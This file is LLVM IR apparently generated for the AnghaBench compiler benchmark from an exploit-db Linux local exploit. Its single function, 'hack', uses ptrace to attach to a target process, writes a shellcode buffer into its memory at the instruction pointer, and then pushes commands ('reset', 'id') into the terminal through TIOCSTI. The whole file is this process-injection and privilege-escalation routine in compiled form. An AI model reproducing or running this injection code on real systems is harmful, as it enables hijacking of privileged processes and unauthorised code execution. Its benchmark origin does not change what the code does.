; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22362.c_hack.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22362.c_hack.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i64, i64 }
%struct.user_regs_struct = type { i32 }
%struct.stat = type { i64, i64 }

@shcode = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [13 x i8] c"/proc/%d/exe\00", align 1
@me = common dso_local global %struct.TYPE_2__ zeroinitializer, align 8
@PTRACE_ATTACH = common dso_local global i32 0, align 4
@PTRACE_GETREGS = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [17 x i8] c"\1B[1;33m+ %d\1B[0m\0A\00", align 1
@PTRACE_SYSCALL = common dso_local global i32 0, align 4
@PTRACE_POKETEXT = common dso_local global i32 0, align 4
@chldpid = common dso_local global i32 0, align 4
@PTRACE_DETACH = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [21 x i8] c"\1B[1;32m- %d ok!\1B[0m\0A\00", align 1
@mode = common dso_local global i64 0, align 8
@M_DOUBLE = common dso_local global i64 0, align 8
@hackpid = common dso_local global i32 0, align 4
@SIGCONT = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [28 x i8] c"\0Aexport TERM='%s'\0Areset\0Aid\0A\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"TERM\00", align 1
@TIOCSTI = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @hack(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.user_regs_struct, align 4
  %5 = alloca [100 x i8], align 16
  %6 = alloca %struct.stat, align 8
  %7 = alloca i32, align 4
  %8 = alloca [1024 x i8], align 16
  %9 = alloca i8*, align 8
  store i32 %0, i32* %2, align 4
  %10 = load i64, i64* @shcode, align 8
  %11 = call i32 @strlen(i64 %10)
  store i32 %11, i32* %7, align 4
  %12 = load i32, i32* %2, align 4
  %13 = call i64 @kill(i32 %12, i32 0)
  %14 = icmp ne i64 %13, 0
  br i1 %14, label %15, label %16

15:                                               ; preds = %1
  br label %131

16:                                               ; preds = %1
  %17 = getelementptr inbounds [100 x i8], [100 x i8]* %5, i64 0, i64 0
  %18 = load i32, i32* %2, align 4
  %19 = call i32 (i8*, i8*, ...) @sprintf(i8* %17, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0), i32 %18)
  %20 = getelementptr inbounds [100 x i8], [100 x i8]* %5, i64 0, i64 0
  %21 = call i64 @stat(i8* %20, %struct.stat* %6)
  %22 = icmp ne i64 %21, 0
  br i1 %22, label %23, label %24

23:                                               ; preds = %16
  br label %131

24:                                               ; preds = %16
  %25 = getelementptr inbounds %struct.stat, %struct.stat* %6, i32 0, i32 0
  %26 = load i64, i64* %25, align 8
  %27 = load i64, i64* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @me, i32 0, i32 0), align 8
  %28 = icmp ne i64 %26, %27
  br i1 %28, label %34, label %29

29:                                               ; preds = %24
  %30 = getelementptr inbounds %struct.stat, %struct.stat* %6, i32 0, i32 1
  %31 = load i64, i64* %30, align 8
  %32 = load i64, i64* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @me, i32 0, i32 1), align 8
  %33 = icmp ne i64 %31, %32
  br i1 %33, label %34, label %35

34:                                               ; preds = %29, %24
  br label %131

35:                                               ; preds = %29
  %36 = load i32, i32* @PTRACE_ATTACH, align 4
  %37 = load i32, i32* %2, align 4
  %38 = call i64 (i32, i32, i32, ...) @ptrace(i32 %36, i32 %37, i32 0, i32 0)
  %39 = icmp ne i64 %38, 0
  br i1 %39, label %40, label %41

40:                                               ; preds = %35
  br label %131

41:                                               ; preds = %35
  br label %42

42:                                               ; preds = %47, %41
  %43 = load i32, i32* @PTRACE_GETREGS, align 4
  %44 = load i32, i32* %2, align 4
  %45 = call i64 (i32, i32, i32, ...) @ptrace(i32 %43, i32 %44, i32 0, %struct.user_regs_struct* %4)
  %46 = icmp ne i64 %45, 0
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  br label %42

48:                                               ; preds = %42
  %49 = load i32, i32* @stderr, align 4
  %50 = load i32, i32* %2, align 4
  %51 = call i32 @fprintf(i32 %49, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0), i32 %50)
  %52 = load i32, i32* @PTRACE_SYSCALL, align 4
  %53 = load i32, i32* %2, align 4
  %54 = call i64 (i32, i32, i32, ...) @ptrace(i32 %52, i32 %53, i32 0, i32 0)
  %55 = icmp ne i64 %54, 0
  br i1 %55, label %56, label %57

56:                                               ; preds = %48
  br label %124

57:                                               ; preds = %48
  br label %58

58:                                               ; preds = %63, %57
  %59 = load i32, i32* @PTRACE_GETREGS, align 4
  %60 = load i32, i32* %2, align 4
  %61 = call i64 (i32, i32, i32, ...) @ptrace(i32 %59, i32 %60, i32 0, %struct.user_regs_struct* %4)
  %62 = icmp ne i64 %61, 0
  br i1 %62, label %63, label %64

63:                                               ; preds = %58
  br label %58

64:                                               ; preds = %58
  store i32 0, i32* %3, align 4
  br label %65

65:                                               ; preds = %86, %64
  %66 = load i32, i32* %3, align 4
  %67 = load i32, i32* %7, align 4
  %68 = icmp sle i32 %66, %67
  br i1 %68, label %69, label %89

69:                                               ; preds = %65
  %70 = load i32, i32* @PTRACE_POKETEXT, align 4
  %71 = load i32, i32* %2, align 4
  %72 = getelementptr inbounds %struct.user_regs_struct, %struct.user_regs_struct* %4, i32 0, i32 0
  %73 = load i32, i32* %72, align 4
  %74 = load i32, i32* %3, align 4
  %75 = add nsw i32 %73, %74
  %76 = load i64, i64* @shcode, align 8
  %77 = load i32, i32* %3, align 4
  %78 = sext i32 %77 to i64
  %79 = add nsw i64 %76, %78
  %80 = inttoptr i64 %79 to i32*
  %81 = load i32, i32* %80, align 4
  %82 = call i64 (i32, i32, i32, ...) @ptrace(i32 %70, i32 %71, i32 %75, i32 %81)
  %83 = icmp ne i64 %82, 0
  br i1 %83, label %84, label %85

84:                                               ; preds = %69
  br label %124

85:                                               ; preds = %69
  br label %86

86:                                               ; preds = %85
  %87 = load i32, i32* %3, align 4
  %88 = add nsw i32 %87, 4
  store i32 %88, i32* %3, align 4
  br label %65

89:                                               ; preds = %65
  %90 = load i32, i32* @chldpid, align 4
  %91 = call i64 @kill(i32 %90, i32 9)
  %92 = load i32, i32* @PTRACE_DETACH, align 4
  %93 = load i32, i32* %2, align 4
  %94 = call i64 (i32, i32, i32, ...) @ptrace(i32 %92, i32 %93, i32 0, i32 0)
  %95 = load i32, i32* @stderr, align 4
  %96 = load i32, i32* %2, align 4
  %97 = call i32 @fprintf(i32 %95, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0), i32 %96)
  %98 = load i64, i64* @mode, align 8
  %99 = load i64, i64* @M_DOUBLE, align 8
  %100 = icmp eq i64 %98, %99
  br i1 %100, label %101, label %122

101:                                              ; preds = %89
  %102 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  store i8* %102, i8** %9, align 8
  %103 = load i32, i32* @hackpid, align 4
  %104 = load i32, i32* @SIGCONT, align 4
  %105 = call i64 @kill(i32 %103, i32 %104)
  %106 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %107 = call i8* @getenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0))
  %108 = call i32 (i8*, i8*, ...) @sprintf(i8* %106, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.3, i64 0, i64 0), i8* %107)
  br label %109

109:                                              ; preds = %113, %101
  %110 = load i8*, i8** %9, align 8
  %111 = load i8, i8* %110, align 1
  %112 = icmp ne i8 %111, 0
  br i1 %112, label %113, label %119

113:                                              ; preds = %109
  %114 = load i32, i32* @TIOCSTI, align 4
  %115 = load i8*, i8** %9, align 8
  %116 = getelementptr inbounds i8, i8* %115, i32 1
  store i8* %116, i8** %9, align 8
  %117 = ptrtoint i8* %115 to i32
  %118 = call i32 @ioctl(i32 0, i32 %114, i32 %117)
  br label %109

119:                                              ; preds = %109
  %120 = load i32, i32* @hackpid, align 4
  %121 = call i32 @waitpid(i32 %120, i32 0, i32 0)
  br label %122

122:                                              ; preds = %119, %89
  %123 = call i32 @exit(i32 0) #3
  unreachable

124:                                              ; preds = %84, %56
  %125 = load i32, i32* @PTRACE_DETACH, align 4
  %126 = load i32, i32* %2, align 4
  %127 = call i64 (i32, i32, i32, ...) @ptrace(i32 %125, i32 %126, i32 0, i32 0)
  %128 = load i32, i32* %2, align 4
  %129 = load i32, i32* @SIGCONT, align 4
  %130 = call i64 @kill(i32 %128, i32 %129)
  br label %131

131:                                              ; preds = %124, %40, %34, %23, %15
  ret void
}

declare dso_local i32 @strlen(i64) #1

declare dso_local i64 @kill(i32, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i64 @stat(i8*, %struct.stat*) #1

declare dso_local i64 @ptrace(i32, i32, i32, ...) #1

declare dso_local i32 @fprintf(i32, i8*, i32) #1

declare dso_local i8* @getenv(i8*) #1

declare dso_local i32 @ioctl(i32, i32, i32) #1

declare dso_local i32 @waitpid(i32, i32, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
